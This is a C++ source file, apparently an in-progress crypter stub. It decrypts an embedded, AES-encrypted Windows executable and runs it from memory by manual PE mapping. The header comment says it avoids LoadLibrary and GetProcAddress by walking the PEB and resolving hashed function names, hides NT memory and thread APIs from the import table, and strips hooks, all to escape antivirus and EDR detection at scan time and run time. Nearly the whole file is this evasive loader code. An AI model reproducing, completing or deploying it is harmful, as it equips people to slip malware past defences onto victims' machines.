#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <unordered_map>
#include <shlwapi.h>  // For PathFileExists
#pragma comment(lib, "Shlwapi.lib") // Needed for PathFileExists
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <tchar.h>
#include <stdbool.h>
#include <random>

/*
Decrypts and executes an embedded 64-bit Portable Executable (PE) in memory. When the PE is mapped in the virtual address 
space of the stub, its import address table (IAT) is resolved recursively while completely avoiding LoadLibraryA, LdrLoadDll, 
GetModuleHandle, and GetProcAddress. GetModuleHandle was implemented manually (get_dll_base) by parsing the process environment block (PEB),
iterating through a linked list of loaded modules, and returning the base address of the DLL when a match is found on the DLL 
name. GetProcAddress (resolveAddr) was implemented manually by taking a module handle from get_dll_base, iterating through its export address
table (EAT), and returning the function address on a match either by name or hashed function name. Since LoadLibraryA 
actually maps DLLs into memory that aren't loaded by default (like kernel32.dll or ntdll.dll), as well as returning the module handle,
it uses the same manual mapping method as the PE payload with a few extra steps. When a DLL needs to be resolved for the PE payload, 
the same load_pe function is called for it, except it recursively calls map_dll when resolving imports. This ensures every DLL dependency
tree that any DLL might have is mapped into memory and relocated. After a base case occurs (IAT is empty), the recursive map_dll call chain returns up the 
callstack by executing the TLS callbacks for the current DLL, calling dllMain, and returning the handle. The caller's IAT is then populated 
with the returned dll base.

This removes the need to use LoadLibraryA, LdrLoadDll, GetModuleHandle, and GetProcAddress completetly, making the stub much less susceptible to
runtime and scantime detections.

After the payload's IAT is populated, all of its addresses are relocated based on the actual base address. The mapped sections are iterated 
over again, so that they can be given the minimum required permissions. When the DLLs and payload are mapped into memory, the regions are 
only given read-write permissions, and only the sections that require read-execute are given that systematically, so there is not one 
large read-write-execute region in memory corresponding to the entire PE. After permissions are updated, a thread is created and passed 
the payload's entry point address. 

The only Windows API functions (that would be flagged as suspicious) used were NtAllocateVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx.
To remove them from the IAT, they are pre-hashed and resolved dynamically, using the manual implementation of GetModuleHandle for the base address 
of ntdll.dll, and the manual implementation of GetProcAddress. Ntdll.dll is loaded into every process by default so there is no need to manually
map it into memory. 

Additionally, hooks in NtAllocateVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx can be detected dynamically and removed. This was
done by checking their function prologues for jumps when resolving their addresses. 

Additionally, when the DLLs and PE are mapped into memory, the region is only given read-write permissions, and only the sections that require 
read-execute are given that systematically, so there is not one large read-write-execute region in memory corresponding to the entire PE. 
*/






/*
Left off -- execute() broken, using old execute and plugging in modules to see where it is going wrong


*/

// Macro instead of using GetCurrentProcess(), since it will always return -1
#define CURRENT_PROCESS_HANDLE ((HANDLE)-1)

using namespace std;

// Undocumented function pointer typedefs
// VirtualAlloc()
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle, 
    PVOID* BaseAddress, 
    ULONG_PTR ZeroBits, 
    PSIZE_T RegionSize, 
    ULONG AllocationType, 
    ULONG Protect
    );


// VirtualProtect()
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// CreateThread
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;
NtProtectVirtualMemory_t pNtProtectVirtualMemory = NULL;
NtCreateThreadEx_t pNtCreateThreadEx = NULL;

bool findDllPath(const char* dllName, wchar_t* outPath, size_t outSize);
void reloc(PIMAGE_NT_HEADERS ntHeaders, void* baseAddress);
void* load_pe(PIMAGE_NT_HEADERS ntHeaders, const vector<unsigned char>& data);
bool resolveImports(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders);
unordered_map<string, HMODULE> loadedDlls;


vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "error creating EVP context" << endl;
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "error initializing decryption" << endl;
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "decryption call failed" << endl;
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}



/*
Goal : given an arbitrary DLL name, in the form of const char* from the payload IAT:
    - Manually map it into memory
    - First thing we need to do is just recursively parse a DLL's dependency tree, and return from the bottom up
    - That way, given any DLL, we recurse down its IAT, until it is empty, 
*/

typedef struct _LDR_DATA_TABLE_ENTRY_EX {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;

DWORD getHashFromString(const char *string){
    size_t strlength = strnlen_s(string, 50);
    DWORD hash = 0x35;

    for(size_t i = 0; i < strlength; i++){
        hash += (hash * 0xab10f29fa + string[i]) & 0xffffffa;
    }

    return hash;
}

PEB* get_peb() {
    return (PEB*)__readgsqword(0x60);  
}

HMODULE get_dll_base(const wchar_t* name) {
    PEB* peb = get_peb();
    LIST_ENTRY* module_list = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current_entry = module_list->Flink;

    while (current_entry != module_list) {
        auto entry = CONTAINING_RECORD(current_entry, LDR_DATA_TABLE_ENTRY_EX, InMemoryOrderLinks);
        
        wchar_t* module_name = entry->BaseDllName.Buffer;
        if (_wcsicmp(module_name, name) == 0) {
            return (HMODULE)entry->DllBase;
        }
        current_entry = current_entry->Flink;
    }
    return nullptr;
}

vector<unsigned char> read_dll(const wchar_t* dllPath){
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        cerr << "CreateFileW failed with error " << GetLastError() << endl;
        return {};
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    vector<unsigned char> data(fileSize);

    DWORD bytesRead;
    ReadFile(hFile, data.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    return data;
}

void* resolveAddr(HMODULE hModule, const char* name, DWORD hash){
    auto dos_header = (PIMAGE_DOS_HEADER)hModule;
    auto nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos_header->e_lfanew);
    auto export_dir_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    auto export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + export_dir_rva);
    auto num = export_dir->NumberOfFunctions;

    auto names = (DWORD*)((BYTE*)hModule + export_dir->AddressOfNames);
    auto functions = (DWORD*)((BYTE*)hModule + export_dir->AddressOfFunctions);
    auto ordinals = (WORD*)((BYTE*)hModule + export_dir->AddressOfNameOrdinals);

    for(DWORD i  = 0; i < export_dir->NumberOfNames; i++){
        const char *fn_name = (const char*)hModule + names[i];

        // Resolve by name, for the payloads imports that need to be resolved
        if(name && strcmp(fn_name, name) == 0) {
            WORD ordinal = ordinals[i];
            DWORD fn_rva = functions[ordinal];
            return ((BYTE*)hModule + fn_rva);
        }
        // Resolve by hash, for functions that should not be in the stubs IAT
        if(!name){
            DWORD fn_hashed = getHashFromString(fn_name);
            if(fn_hashed == hash){
                WORD ordinal = ordinals[i];
                DWORD fn_rva = functions[ordinal];
                printf("Function: %s (hash: %u) resolved at: %p\n", fn_name, fn_hashed, ((BYTE*)hModule + fn_rva));
                if(strcmp(fn_name, "NtAllocateVirtualMemory") == 0 || strcmp(fn_name, "NtCreateThreadEx") == 0){
                    for(uint16_t j = 0; j < 21; j++){
                        cout << "0x" << (int)*((BYTE*)hModule + fn_rva + j) << " ";
                    }
                }

                return ((BYTE*)hModule + fn_rva);
            }
        }

    }
    cout << "Failed to resolve address for:\nHash:" << hash << "\nname:" << name << endl;
    return nullptr;
}


void executeTLS(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders){
    if(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size > 0){
        PIMAGE_TLS_DIRECTORY tlsDir = (PIMAGE_TLS_DIRECTORY)((HMODULE)mappedBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tlsDir->AddressOfCallBacks;

        while(callback && *callback){
            (*callback)((LPVOID)mappedBase, DLL_PROCESS_ATTACH, NULL);
            callback++;
        }

    }
}

// Need to check if the DLL has already been 'seen' and is up the recursion tree, or if its in the PEB 
// In both cases just return the handle to it 
// In any other case it needs to be read from disk, mapped into memory, and we need to recursively check its imports 
// Base case: DLL has no imports, can apply relocations, execute TLS callbacks, execute dllmain, return to caller
HMODULE map_dll(const char* dllName){
    cout << "Mapping " << dllName << endl;
    auto it = loadedDlls.find(dllName);
    if(it != loadedDlls.end()){
        cout << dllName << " found in loadedDlls" << endl;
        return it->second;
        // if the DLL name is found in loadDlls, return the base address (second field of each map entry)
    }
    loadedDlls[dllName] = (HMODULE)0x1; // Mark the DLL as loading

    // Convert dllName to wide char, check if its already loaded in the process, but hasnt been seen yet
    wchar_t wDllName[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, dllName, -1, wDllName, MAX_PATH);
    HMODULE module = get_dll_base(wDllName);

    // Return base and add to dll map 
    if(module){
        cout << dllName << " found in PEB" << endl;
        loadedDlls[dllName] = module;
        return module;
    }

    wchar_t dllPath[MAX_PATH];
    if(!findDllPath(dllName, dllPath, MAX_PATH)){
        cerr << "Failed to locate DLL: " << dllName << endl;
        return NULL;
    }

    // DLL was located, read from disk 
    vector<unsigned char> data = read_dll(dllPath);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);

    void* mappedBase = load_pe(ntHeaders, data);
    if(!mappedBase){
        cerr << "Failed to write DLL to address space" << endl;
        return NULL;
    }

    executeTLS(mappedBase, ntHeaders);

    typedef BOOL(WINAPI* DllEntry)(HINSTANCE, DWORD, LPVOID);
    DllEntry entry = (DllEntry)((BYTE*)mappedBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)mappedBase, DLL_PROCESS_ATTACH, NULL);

    loadedDlls[dllName] = (HMODULE)mappedBase;

    return (HMODULE)mappedBase;
}

bool findDllPath(const char* dllName, wchar_t* outPath, size_t outSize) {
    // Check in System32
    wsprintfW(outPath, L"C:\\Windows\\System32\\%hs", dllName);
    if (PathFileExistsW(outPath)) return true;

    // Check in SysWOW64 (for 32-bit apps on 64-bit Windows)
    wsprintfW(outPath, L"C:\\Windows\\SysWOW64\\%hs", dllName);
    if (PathFileExistsW(outPath)) return true;

    // Check in current directory
    wsprintfW(outPath, L"%hs", dllName);
    if (PathFileExistsW(outPath)) return true;

    return false; // DLL not found
}

void reloc(PIMAGE_NT_HEADERS ntHeaders, void* baseAddress){
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)baseAddress + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (relocation->VirtualAddress > 0) {
            uintptr_t delta = (uintptr_t)((BYTE*)baseAddress - ntHeaders->OptionalHeader.ImageBase);

            int count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntry = (PWORD)((BYTE*)relocation + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < count; i++, relocEntry++) {
                if (*relocEntry & 0xF000) {
                    uintptr_t* patchAddr = (uintptr_t*)((BYTE*)baseAddress + relocation->VirtualAddress + (*relocEntry & 0xFFF));
                    *patchAddr += delta;
                    //printf("Applying relocation at: %p, Original: %p, Patched: %p\n", patchAddr, *patchAddr, *patchAddr + delta);                 
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
        }
    }
    cout << "Relocations applied" << endl;
    return;/**/
}

void* load_pe(PIMAGE_NT_HEADERS ntHeaders, const vector<unsigned char>& data){
    // Convert to NtAllocateVirtualMemory
    
    void* baseAddress = VirtualAlloc(
        NULL,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );

    /*
    void* baseAddress = NULL;
    SIZE_T regionSize = (SIZE_T)ntHeaders->OptionalHeader.SizeOfImage;
    NTSTATUS status = pNtAllocateVirtualMemory(
        CURRENT_PROCESS_HANDLE,
        (PVOID*)&baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        cerr << "NtAllocateVirtualMemory failed with status: " << status << endl;
        return nullptr;
    }*/
    cout << "Memory allocation at: " << baseAddress << endl;

    //memset(baseAddress, 0xAA, ntHeaders->OptionalHeader.SizeOfImage);
    memcpy(baseAddress, data.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
    //cout << "Headers copied" << endl;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        void* sectionDest = (void*)((BYTE*)baseAddress + section->VirtualAddress);
        void* sectionSrc = (void*)((BYTE*)data.data() + section->PointerToRawData);
        memcpy(sectionDest, sectionSrc, section->SizeOfRawData);
        cout << "Section " << section->Name << " copied to " << sectionDest << endl;
    }

    reloc(ntHeaders, baseAddress);
    cout << "Resolving imports" << endl;
    if(!resolveImports(baseAddress, ntHeaders)){
        cerr << "Failed to resolve imports" << endl;
        return NULL;
    }

    // Following the LoadLibraryA / LdrLoadDll convention of memory protections
    /*
    DWORD oldProtect; //default
    section =  IMAGE_FIRST_SECTION(ntHeaders);
    for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
        DWORD newProtect = PAGE_NOACCESS;
        //regionSize = (SIZE_T)section->Misc.VirtualSize;
        void* sectionAddress = (BYTE*)baseAddress + section->VirtualAddress;

        // Had issues with entry point not having RX, explicitly setting the .text section just in case
        // Even though the entry point is also explicitly set to RX
        if(strcmp(".text", (char*)section->Name) == 0){
            newProtect = PAGE_EXECUTE_READ;
        } else if(section->Characteristics & IMAGE_SCN_MEM_EXECUTE){
            newProtect = (section->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (section->Characteristics & IMAGE_SCN_MEM_WRITE){
            newProtect = PAGE_READWRITE;
        } else {
            newProtect = PAGE_READONLY;
        }

        VirtualProtect((BYTE*)baseAddress + section->VirtualAddress, section->Misc.VirtualSize, newProtect, &oldProtect);
    }*/

    return baseAddress;
}

bool resolveImports(void* mappedBase, PIMAGE_NT_HEADERS ntHeaders){
    if(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size == 0){
        return true;
    }
    
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)mappedBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (importDescriptor->Name) {
        cout << "Resolving import " << importDescriptor->Name << endl;
        const char* dllName = (char*)((BYTE*)mappedBase + importDescriptor->Name);
        HMODULE module = NULL;
        // Same as earlier, check if its been seen, and will be processed eventually, then try and get a handle from the PEB
        // By the time this is called for the PE, all DLLs should have their handle in the loadedDlls map or be in the PEB
        auto it = loadedDlls.find(dllName);
        if(it != loadedDlls.end() && it->second != (HMODULE)0x1){
            cout << "Module found in loadedDlls" << endl;
            module = it->second;
        } else {
            wchar_t wDllName[MAX_PATH];
            MultiByteToWideChar(CP_UTF8, 0, dllName, -1, wDllName, MAX_PATH);
            module = get_dll_base(wDllName);

            if(!module){
                // Search for the module like LLA would
                module = map_dll(dllName);
                if(!module){
                    cerr << "Failed to map dependency " << dllName << endl;
                    return false;
                }
            } else {
                cout << "Module found in PEB" << endl;
            }
        }

        // Once the recursive calls hit a base case, patch the IAT for that DLL, work back up the callstack
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)mappedBase + importDescriptor->FirstThunk);
        while (thunk->u1.AddressOfData) {
            PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)mappedBase + thunk->u1.AddressOfData);
            FARPROC func = (FARPROC)resolveAddr(module, import->Name, 0);
            if (!func) {
                cerr << "Failed to get address of function: " << import->Name  << endl;
                return false;
            }
            
            thunk->u1.Function = (uintptr_t)func;
            thunk++;
        }
        importDescriptor++;
    }

    return true;
}
void TestEntry() {
    printf("[DEBUG] Entry Point Hit!\n");
}

//this works for some reason
/*
void execute(const vector<unsigned char> &payload) {

    // Get DOS and NT Headers from the payload, e_lfanew is the offset start of the exe
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    // Validates DOS and NT Headers
    
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        cerr << "DOS Invalid" << endl;
        return;
    }
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        cerr << "NT Invalid" << endl;

        return;
    }
    
    void* execMemory = VirtualAlloc(
        NULL,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    
    if (!execMemory) {
        cerr << "VirtualAlloc failed with error code: " << GetLastError() << endl;

        return;
    }
    
    cout << "Memory allocation at: " << execMemory << endl;
    
    memcpy(execMemory, payload.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
    cout << "Headers copied" << endl;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        void* sectionDest = (void*)((BYTE*)execMemory + section->VirtualAddress);
        void* sectionSrc = (void*)((BYTE*)payload.data() + section->PointerToRawData);
        memcpy(sectionDest, sectionSrc, section->SizeOfRawData);

        cout << "Section " << section->Name << " copied to " << sectionDest << endl;
    }

    reloc(ntHeaders, execMemory);
    // Works as expected
    if(!resolveImports(execMemory, ntHeaders)){
        cerr << "Failed to resolve imports " << endl;
    }

    DWORD oldProtect; //default
    section =  IMAGE_FIRST_SECTION(ntHeaders);
    for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
        DWORD newProtect = PAGE_NOACCESS;
        //regionSize = (SIZE_T)section->Misc.VirtualSize;
        void* sectionAddress = (BYTE*)execMemory + section->VirtualAddress;

        // Had issues with entry point not having RX, explicitly setting the .text section just in case
        // Even though the entry point is also explicitly set to RX 
        if(strcmp(".text", (char*)section->Name) == 0){
            newProtect = PAGE_EXECUTE_READ;
        } else if(section->Characteristics & IMAGE_SCN_MEM_EXECUTE){
            newProtect = (section->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (section->Characteristics & IMAGE_SCN_MEM_WRITE){
            newProtect = PAGE_READWRITE;
        } else {
            newProtect = PAGE_READONLY;
        }

        VirtualProtect((BYTE*)execMemory + section->VirtualAddress, section->Misc.VirtualSize, newProtect, &oldProtect);
    }

    void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    VirtualProtect(entryPoint, 0x1000, PAGE_EXECUTE_READ, &oldProtect);
    cout << "Image entry point: " << entryPoint << endl;
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    if (!thread) {
        cerr << "CreateThread failed with error code: " << GetLastError()  << endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }
    
    cout << "Thread created, waiting...\n";    
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(execMemory, 0, MEM_RELEASE);
    
} */

/*BROKEN EXECUTE-----------------------------------------------------------------*/
void execute(const vector<unsigned char> &payload) {
    // Get DOS and NT Headers from the payload, e_lfanew is the offset start of the exe
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    void* execMemory = load_pe(ntHeaders, payload);
    if(!execMemory){
        cerr << "Failed to allocate memory for PE" << endl;
        return;
    }
    cout << "Memory allocation at: " << execMemory << endl;    

    // Entry point was being placed in its own page, outside of the .text section, and was RO / RW  
    // So we need to explicitly set it to execute, in either case, it will be executable since the 
    // .text section entirely is set to RX in load_pe() 
    DWORD oldProtect;
    PIMAGE_SECTION_HEADER section =  IMAGE_FIRST_SECTION(ntHeaders);
    for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
        DWORD newProtect = PAGE_NOACCESS;
        SIZE_T regionSize = (SIZE_T)section->Misc.VirtualSize;
        void* sectionAddress = (BYTE*)execMemory + section->VirtualAddress;

        // Had issues with entry point not having RX, explicitly setting the .text section just in case
        // Even though the entry point is also explicitly set to RX 
        if(strcmp(".text", (char*)section->Name) == 0){
            newProtect = PAGE_EXECUTE_READ;
        } else if(section->Characteristics & IMAGE_SCN_MEM_EXECUTE){
            newProtect = (section->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (section->Characteristics & IMAGE_SCN_MEM_WRITE){
            newProtect = PAGE_READWRITE;
        } else {
            newProtect = PAGE_READONLY;
        }

        //VirtualProtect((BYTE*)execMemory + section->VirtualAddress, section->Misc.VirtualSize, newProtect, &oldProtect);
        NTSTATUS status = pNtProtectVirtualMemory(CURRENT_PROCESS_HANDLE, &sectionAddress, &regionSize, newProtect, &oldProtect);
    }

    void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    cout << "Image entry point: " << entryPoint << endl;
    SIZE_T regionSize = 0x1000;
    VirtualProtect(entryPoint, 0x1000, PAGE_EXECUTE_READ, &oldProtect);

    // Convert to NT version
    //HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
    HANDLE hThread = NULL;
    NTSTATUS status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        CURRENT_PROCESS_HANDLE,
        (PVOID)entryPoint,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    
    if (!hThread) {
        cerr << "CreateThread failed with status code: " << status  << endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }
    
    cout << "Thread created, waiting...\n";    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(execMemory, 0, MEM_RELEASE);
    
}



void resolveFuncPointers(DWORD *hashes, HMODULE handle){
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)resolveAddr(handle, 0, hashes[0]);
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)resolveAddr(handle, 0, hashes[1]);
    pNtCreateThreadEx = (NtCreateThreadEx_t)resolveAddr(handle, 0, hashes[2]);

    void* realLLA = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    void* realVA = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    void* realCT = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

    printf("[+] pNtAllocateVirtualMemory: %p : %p\n", pNtAllocateVirtualMemory, realLLA);
    printf("[+] pNtProtectVirtualMemory: %p : %p\n", pNtProtectVirtualMemory, realVA);
    printf("[+] pNtCreateThreadEx: %p : %p\n", pNtCreateThreadEx, realCT);

}

// Placeholders
const vector<unsigned char> ENCRYPTED = { /*ENCRYPTED_BYTES*/ };
const vector<unsigned char> KEY = { /*KEY*/ };
const vector<unsigned char> IV = { /*IV*/ };


int main(){
    cout << getHashFromString("NtAllocateVirtualMemory") << endl << getHashFromString("NtProtectVirtualMemory") << endl << getHashFromString("NtCreateThreadEx") << endl;
    DWORD hashes[] = {2947333021, 2924161265, 2276886725};

    vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
    resolveFuncPointers(hashes, get_dll_base(L"ntdll.dll"));
    execute(payload);

    return 0;
}